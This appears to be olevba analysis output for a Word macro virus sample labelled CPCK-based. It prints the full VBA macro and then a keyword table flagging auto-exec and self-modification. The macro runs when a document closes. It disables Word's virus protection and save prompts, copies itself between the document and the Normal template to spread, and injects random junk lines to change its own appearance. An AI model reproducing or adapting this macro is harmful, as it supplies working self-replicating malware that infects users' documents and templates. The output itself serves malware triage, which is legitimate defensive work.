olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-ee82f82ed4957c08019003c3247dbdc41767b29f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-ee82f82ed4957c08019003c3247dbdc41767b29f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()

On Error Resume Next

LO82 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

KS93 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Options.SaveNormalPrompt = 0

Options.VirusProtection = 0

Application.EnableCancelKey = 0

Options.ConfirmConversions = 0

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set OF18 = ActiveDocument.VBProject.VBComponents.Item(1)

VH34 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set OF18 = NormalTemplate.VBProject.VBComponents.Item(1)

MT93 = True

End If

If MT93 <> True And VH34 <> True Then GoTo HH97

If MT93 = True Then OF18.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, LO82 - 1))

If VH34 = True Then OF18.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, KS93 - 1))

With OF18.CodeModule

For x = 2 To (OF18.CodeModule.CountOfLines - 1) Step 2

For y = 1 To (Int(Rnd * 10) + 2)

FS48 = FS48 + (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & " + "

Next y

.replaceline x, (Chr(65 + Int(Rnd * 22))) & " = " & FS48 & (Chr(65 + Int(Rnd * 22)))

FS48 = ""

Next x

End With

HH97:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

